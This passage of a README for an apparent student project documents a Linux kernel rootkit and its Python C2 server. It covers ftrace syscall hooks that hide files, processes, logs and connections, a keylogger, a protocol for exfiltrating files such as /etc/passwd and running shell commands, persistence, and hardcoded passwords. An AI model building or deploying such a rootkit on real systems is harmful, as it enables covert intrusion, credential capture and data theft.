<!-- SCREENSHOT: keylogger avec frappes capturees -->
<!-- ![Keylogger](screenshots/c2-keylogger.png) -->

---

#### Modules

Liste des modules noyau charges sur la victime (equivalent de `lsmod`).

> `wlkom` n'apparaît PAS dans cette liste (il est caché).

---

#### Stealth

Tableau de bord des capacités de dissimulation du rootkit.

Affiche l'état de chaque mécanisme :
- Module caché de lsmod
- Module caché de /proc/modules et /sys/module
- Fichiers cachés de ls
- Logs noyau filtrés
- Connexion cachée de ss/netstat
- PID du kthread caché

<!-- SCREENSHOT: panneau stealth avec tous les statuts -->
<!-- ![Stealth](screenshots/c2-stealth.png) -->

---

#### Syscalls

Visualisation des hooks syscall actifs.

| Hook | Syscall | Rôle |
|:---|:---|:---|
| hk_getdents64 | `__x64_sys_getdents64` | Cache fichiers/PIDs |
| hk_read | `__x64_sys_read` | Filtre logs + capture TTY |
| hk_recvmsg | `__x64_sys_recvmsg` | Cache connexion de ss |

---

#### MITRE ATT&CK

Mapping des techniques MITRE ATT&CK utilisees par le rootkit :
- Initial Access, Exécution, Persistence, Defense Evasion, Collection, Command & Control

---

#### Deploy

| Action | Description |
|:---|:---|
| **Compile** | Compile le rootkit à distance sur la victime |
| **Load** | Charge le module (insmod) |
| **Uninstall** | Décharge le module + supprime la persistance + nettoie |

<!-- SCREENSHOT: panneau deploy -->
<!-- ![Deploy](screenshots/c2-deploy.png) -->

---

#### Activity

Journal de toutes les actions effectuees. Export en JSON disponible.

---

#### Settings

| Paramètre | Description |
|:---|:---|
| **Restart C2** | Redémarre le serveur C2 |
| **Reconnect rootkit** | Force la reconnexion |
| **Change password** | Modifie le mot de passe de la plateforme web |
| **Session info** | Duree de session, token actif |

---

## 11 - Fonctionnalités du rootkit

### 11.1 - Hooks syscall via ftrace

Le rootkit utilise **ftrace** pour intercepter les appels système. Ftrace est un mecanisme de tracage du noyau Linux qui permet de rediriger l'exécution d'une fonction vers une fonction personnalisee.

**Principe :**

```
Programme userland
       │
       ▼
  Appel système (ex: getdents64)
       │
       ▼
  ┌──────────────────────┐
  │ Ftrace intercepte    │
  │ l'appel et redirige  │──► hk_getdents64() (notre hook)
  │ vers notre fonction  │         │
  └──────────────────────┘         │  filtre les entrees
                                   │  contenant "wlkom"/"zroot"
                                   ▼
                              Résultat filtré
                              retourne au programme utilisateur
```

**Resolution des symboles :** Le rootkit utilise `kprobe` pour trouver l'adresse des fonctions noyau a hooker (`wlkom_ksym()`), car `kallsyms_lookup_name` n'est plusexporté depuis Linux 5.7.

### 11.2 - Dissimulation complete

```
┌─────────────────────────────────────────────────────────────────┐
│                  MECANISMES DE DISSIMULATION                    │
├─────────────────────┬───────────────────────────────────────────┤
│ Ce qu'oncaché      │ Comment                                   │
├─────────────────────┼───────────────────────────────────────────┤
│ Module (lsmod)      │ list_del() sur THIS_MODULE->list          │
│ Module (/sys)       │ kobject_del() sur mkobj.kobj              │
│ Fichiers (ls)       │ Hook getdents64, filtre les noms          │
│                     │ contenant "wlkom" ou "zroot"              │
│ Logs (dmesg)        │ Hook read, filtre lignes contenant        │
│                     │ "wlkom" ou "zroot"                        │
│ Réseau (ss/netstat) │ Hook recvmsg sur NETLINK_SOCK_DIAG,      │
│                     │ filtre par port C2                        │
│ Réseau (/proc/net)  │ Hook read, filtre hex du port             │
│                     │ (0x270F = 9999) et IP C2                  │
│ Processus (ps)      │ Hook getdents64 sur /proc, filtre         │
│                     │ les PIDs dans hidden_pids[]               │
└─────────────────────┴───────────────────────────────────────────┘
```

### 11.3 - Keylogger

Le keylogger utilise **deux mecanismes complementaires** :

| Mecanisme | Cible | Methode |
|:---|:---|:---|
| `keyboard_notifier` | Console physique (TTY) | Callback noyau sur KBD_KEYSYM |
| Hook `sys_read` | Sessions SSH (PTY) | Intercepte les lectures sur les terminaux (major 4 = /dev/ttyN, major 136 = /dev/pts/N) |

Le buffer de capture est un **ring buffer** de 4096 octets. Il est vide à chaque lecture (`KEYLOG_DUMP`).

### 11.4 - Protocole de communication

**Authentification :**

```
Rootkit ──── "AUTH_REQUIRED\n" ────► C2
Rootkit ◄─── "wlkom2024\n" ────────  C2
Rootkit ──── "AUTH_OK\n" ──────────► C2    (ou "AUTH_FAIL\n")
```

**Exécution de commande :**

```
Rootkit ◄─── "ls -la /etc\n" ──────  C2
Rootkit ──── "<sortie commande>" ──► C2
```

**Download (victime vers attaquant) :**

```
Rootkit ◄─── "DOWNLOAD:/etc/passwd\n" ──  C2
Rootkit ──── "FILE:/etc/passwd:1547\n" ─► C2
Rootkit ──── <donnees par chunks 4K> ───► C2
Rootkit ──── "EOF\n" ──────────────────► C2
```

**Upload (attaquant vers victime) :**

```
Rootkit ◄─── "UPLOAD:/tmp/payload\n" ────  C2
Rootkit ◄─── "4096\n" (taille) ──────────  C2
Rootkit ──── "READY\n" ────────────────► C2
Rootkit ◄─── <donnees par chunks> ───────  C2
Rootkit ──── "UPLOAD_OK\n" ────────────► C2
```

### 11.5 - Commandes speciales du rootkit

| Commande | Reponse | Description |
|:---|:---|:---|
| `DOWNLOAD:<chemin>` | `FILE:...` + data + `EOF` | Télécharger un fichier |
| `UPLOAD:<chemin>` | `UPLOAD_OK` | Recevoir un fichier |
| `HIDE_PID:<pid>` | `PID_HIDDEN` | Cacher un processus |
| `UNHIDE_PID:<pid>` | `PID_UNHIDDEN` | Montrer un processus |
| `LIST_HIDDEN_PIDS` | `<liste pids>` | Lister les PIDs cachés |
| `KEYLOG_START` | `KEYLOGGER_ON` | Activer le keylogger |
| `KEYLOG_STOP` | `KEYLOGGER_OFF` | Desactiver le keylogger |
| `KEYLOG_DUMP` | `<buffer>` | Lire et vider le buffer |
| `KEYLOG_STATUS` | `KEYLOGGER:ON/OFF` | État du keylogger |
| *toute autre commande* | *sortie de la commande* | Execute via `/bin/sh -c` |

---

## 12 - Fonctionnalités du C2

### 12.1 - Architecture

Le C2 est un serveur web ecrit en **Python 3** :

| Composant | Rôle | Version |
|:---|:---|:---|
| FastAPI | Framework web asynchrone | 0.136.1 |
| Uvicorn | Serveur ASGI | 0.47.0 |
| WebSocket | Communication temps réel navigateur | 16.0 |
| Cryptography | Dérivation declé + chiffrement | 38.0.4 |

> Le C2 tient dans **un seul fichier** : `c2.py` (~3500 lignes). Le HTML, CSS et JavaScript sont embarqués directement dans le Python.

### 12.2 - Ports utilises

| Port | Protocole | Direction | Usage |
|:---|:---|:---|:---|
| **8080** | HTTP + WebSocket | Navigateur → C2 | Interface web |
| **9999** | TCP (chiffré) | Rootkit → C2 | Connexion persistante (listener) |
| **9998** | TCP (chiffré) | C2 → Rootkit | Envoi de commandes (writer) |

### 12.3 - API REST

| Endpoint | Methode | Auth | Description |
|:---|:---:|:---:|:---|
| `/` | GET | Non | Page web complète du C2 |
| `/api/login` | POST | Non | Authentification (retourne un token) |
| `/api/logout` | POST | Oui | Déconnexion (supprime le token) |
| `/api/status` | GET | Non | État du C2 et du rootkit |
| `/api/exec` | POST | Oui | Executer une commande sur la victime |
| `/api/upload` | POST | Oui | Upload fichier vers la victime |
| `/api/dl/<fichier>` | GET | Non | Télécharger un fichier depuis le C2 |
| `/api/reconnect-rk` | POST | Oui | Forcer la reconnexion du rootkit |
| `/api/restart-c2` | POST | Oui | Redémarrer le serveur C2 |
| `/api/change-password` | POST | Oui | Changer le mot de passe plateforme |
| `/ws` | WebSocket | Non | Flux temps réel (logs, output, events) |

---

## 13 - Architecture technique

### 13.1 - Structure du code source du rootkit

`wlkom.c` — 1166 lignes de C

```
 Lignes  │ Section
─────────┼──────────────────────────────────────────────
   1-33  │ Includes, MODULE_* macros, paramètres
  34-52  │ Variables globales (socket, thread, PID hiding, keylogger)
  64-73  │ Constantes crypto (ChaCha20-Poly1305)
  74-141 │ Infrastructure ftrace (resolution symboles, install/remove hook)
 143-221 │ Hook getdents64 (cacher fichiers + PIDs)
 228-376 │ Hook read (filtrer lignes + capturer TTY/keylogger)
 378-527 │ Hook recvmsg (cacher connexion de ss/netstat)
 529-592 │ Keylogger (keyboard_notifier + dump)
 594-731 │ Réseau TCP (send/recv chiffré, connexion C2)
 752-803 │ Crypto (SHA-256, dérivation clé ChaCha20)
 805-879 │ Exécution de commandes (call_usermodehelper)
 881-951 │ Download / Upload fichiers
 953-982 │ Persistence (copie module + config boot)
 984-992 │ Dissimulation module (list_del + kobject_del)
 994-1141│ Thread C2 principal (boucle connexion + commandes)
1143-1166│ Init / Exit module
```

### 13.2 - Flux d'exécution complet

```
insmod wlkom.ko pw_hash=... c2_ip=... c2_port=...
  │
  ▼
wlkom_init()
  │
  └──► kthread_run(c2_thread_fn)
         │
         │  Phase d'initialisation (2s après chargement) :
         │
         ├── set_persistence()      Copie zroot.ko + config modprobe
         ├── hide_module()          list_del + kobject_del
         ├── hide_files_init()      Installe hook getdents64
         ├── hide_lines_init()      Installe hook read
         ├── crypto_derive_key()    Dériveclé ChaCha20 depuis pw_hash
         ├── net_hide_init()        Prepare hex pour filtrage /proc/net/tcp
         ├── hide_ss_init()         Installe hook recvmsg
         ├── keylogger_start()      Register keyboard_notifier
         ├── auto-hide kthread PID
         │
         │  Boucle principale (infinie) :
         │
         ├── Si pasconnecté :
         │     └── connect_to_c2()  TCP vers c2_ip:c2_port
         │     └── Envoie "AUTH_REQUIRED\n"
         │     └── Si echec : attend 5s et reessaie
         │
         ├── Recoit message (non-bloquant, 200ms timeout) :
         │
         ├── Si pas authentifie :
         │     └── check_password() → "AUTH_OK\n" ou "AUTH_FAIL\n"
         │
         └── Si authentifie :
               ├── "DOWNLOAD:..." → do_download()
               ├── "UPLOAD:..."   → do_upload()
               ├── "HIDE_PID:..." → ajoute a hidden_pids[]
               ├── "KEYLOG_*"     → start/stop/dump/status
               └── <autre>        → exec_cmd()
```

---

## 14 - Sécurité et chiffrement

### 14.1 - ChaCha20-Poly1305 (AEAD)

Toutes les communications rootkit ↔ C2 sont chiffrees avec **ChaCha20-Poly1305** :

| Propriete | Valeur |
|:---|:---|
| Algorithme | ChaCha20 (chiffrement) + Poly1305 (authentification) |
| Type | AEAD (Authenticated Encryption with Associated Data) |
| Taille declé | 256 bits (32 octets) |
| Taille du nonce | 64 bits (8 octets) — compteur incrementant |
| Taille du tag | 128 bits (16 octets) |

> **Pourquoi ChaCha20 ?** C'est l'alternative recommandee a AES-GCM. Il est disponible nativement dans le noyau Linux (`crypto/chacha20poly1305.h`) et en Python (`cryptography`).

### 14.2 - Dérivation de laclé

Laclé n'est **jamais transmise** sur le réseau. Les deux cotes la dérivent independamment :

```
Cle = SHA-256( "wlkom_crypto_" + pw_hash )
```

| Cote | Calcul | Bibliotheque |
|:---|:---|:---|
| Rootkit (noyau) | `compute_sha256("wlkom_crypto_" + pw_hash, crypto_key)` | `<crypto/hash.h>` |
| C2 (Python) | `hashlib.sha256(b"wlkom_crypto_" + pw_hash).digest()` | `hashlib` |

### 14.3 - Format des trames

Chaque message envoye sur le réseau a ce format :

```
┌───────────────┬──────────────┬─────────────────────────────────┐
│ 4 octets      │ 8 octets     │ N octets + 16 octets            │
│ Taille (BE)   │ Nonce (LE)   │ Texte chiffré   │  Tag Poly1305 │
│               │ (compteur)   │ (ChaCha20)      │  (MAC 128-bit)│
└───────────────┴──────────────┴─────────────────────────────────┘
        │                │                    │
        │                │                    └── Integrite : si un
        │                │                        seul bit est modifie,
        │                │                        le dechiffrement echoue
        │                │
        │                └── Nonce unique par message (compteur 64-bit)
        │                    Empeche les attaques par rejeu
        │
        └── Taille du payload en big-endian
            Permet de lire le message en entier avant dechiffrement
```

### 14.4 - Double authentification

```
┌──────────────────────────────────────────────────────────┐
│                                                          │
│  NIVEAU 1 : Plateforme web                              │
│  ─────────────────────────                               │
│  Mot de passe : "zerotrust" (modifiable)                 │
│  Protection : 3 tentatives → lock 30s                    │
│  Session : token aleatoire, expire après 1h              │
│  Stockage : sessionStorage (cote navigateur)             │
│                                                          │
│  ┌──────────────────────────────────────────────────┐    │
│  │                                                  │    │
│  │  NIVEAU 2 : Rootkit                             │    │
│  │  ──────────────────                              │    │
│  │  Mot de passe : choisi au chargement du module   │    │
│  │  Vérification : SHA-256 (cote noyau)             │    │
│  │  Transport : canal chiffré ChaCha20-Poly1305     │    │
│  │  Echec : deconnexion + reconnexion dans 5s       │    │
│  │                                                  │    │
│  └──────────────────────────────────────────────────┘    │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

## 15 - Dépannage

### Le rootkit ne se connecte pas au C2

| Vérification | Commande | Attendu |
|:---|:---|:---|
| C2 lancé ? | `ss -tlnp \| grep 9999` (sur attaquant) | Ligne avec LISTEN |
| Réseau OK ? | `ping -c 1 <IP_ATTAQUANTE>` (depuis victime) | 0% packet loss |
| Bonne IP ? | Vérifier le `c2_ip` passé à `insmod` | IP de l'attaquante |
| Logs C2 | `cat /tmp/c2.log` (sur attaquant) | Messages d'erreur ? |

### L'interface web ne se charge pas

| Vérification | Commande | Attendu |
|:---|:---|:---|
| C2 écoute sur 8080 ? | `ss -tlnp \| grep 8080` (sur attaquant) | Ligne avec LISTEN |
| Bonne URL ? | `http://<IP_ATTAQUANT>:8080` | Page de login |
| Firewall ? | `iptables -L -n` (sur attaquant) | Pas de règle bloquante |

### Le rootkit ne compile pas

| Vérification | Commande | Attendu |
|:---|:---|:---|
| Headers installés ? | `ls /lib/modules/$(uname -r)/build/Makefile` | Le fichier existe |
| GCC installé ? | `gcc --version` | gcc 12.x |
| Make installé ? | `make --version` | GNU Make 4.x |
| Si headers manquants | `apt install linux-headers-$(uname -r)` | Installation OK |

### Le rootkit ne persiste pas après reboot

| Vérification | Commande |
|:---|:---|
| Fichier module copie ? | `ls /lib/modules/$(uname -r)/extra/zroot.ko` |
| Config auto-load ? | `cat /etc/modules-load.d/zroot.conf` |
| Config paramètres ? | `cat /etc/modprobe.d/zroot.conf` |
| Logs de boot | `journalctl -b \| grep -i "zroot\|module"` |

> **Note** : ces fichiers sont normalement cachés par le rootkit. Vérifiez-les **avant** le premier chargement ou depuis un live USB.

### Désinstallation manuelle du rootkit

Si le rootkit est chargé, il bloque `rmmod`. Pour le désinstaller :

**Methode 1** — Via le panneau Deploy de l'interface web (bouton "Uninstall")

**Methode 2** — Manuellement :

1. Redémarrez la VM en editant GRUB : ajoutez `module_blacklist=zroot` à la ligne de boot
2. Une fois demarree sans le rootkit :
   ```bash
   rm -f /lib/modules/$(uname -r)/extra/zroot.ko
   rm -f /etc/modules-load.d/zroot.conf
   rm -f /etc/modprobe.d/zroot.conf
   depmod -a
   ```
3. Redémarrez normalement

---

## 16 - Structure du projet

```
wlkom/
│
├── AUTHORS                          Login EPITA de l'auteur
├── README.md                        Ce fichier (documentation complete)
├── TODO                             Fonctionnalités done + futures
│
├── screenshots/                     Captures d'ecran de l'interface et des VMs
│
├── rootkit/
│   ├── wlkom.c                      Code source du rootkit (1166 lignes C)
│   ├── wlkom_commented.c            Version commentee (explications détaillées + glossaire)
│   ├── Makefile                     Compilation du module noyau
│   ├── ssh_victim.sh                Raccourci SSH vers la victime
│   └── ssh_attacker.sh              Raccourci SSH vers l'attaquant
│
└── attacking_program/
    ├── c2.py                        Serveur C2 complet (~3500 lignes Python)
    │                                HTML + CSS + JS embarqués
    └── c2_commented.py              Version commentee du backend (+ glossaire)
```

### Dépendances completes

**VM Victime** (compilation + exécution du rootkit) :

| Paquet | Version | Installation |
|:---|:---|:---|
| build-essential | 12.9 | `apt install build-essential` |
| linux-headers | 6.1.0-44 | `apt install linux-headers-$(uname -r)` |
| gcc | 12.2.0 | (inclus dans build-essential) |
| make | 4.3 | (inclus dans build-essential) |

**VM Attaquante** (serveur C2) :

| Paquet | Version | Installation |
|:---|:---|:---|
| python3 | 3.11.2 | `apt install python3 python3-venv` |
| fastapi | 0.136.1 | `pip install fastapi` |
| uvicorn | 0.47.0 | `pip install uvicorn[standard]` |
| websockets | 16.0 | `pip install websockets` |
| cryptography | 38.0.4 | `pip install cryptography` |

---

<p align="center">
  <b>WLKOM</b> — Wild Linux Kernel Object Module<br>
  Projet EPITA SYS2 — APPING1<br>
  <i>yazid.tarmoul</i>
</p>
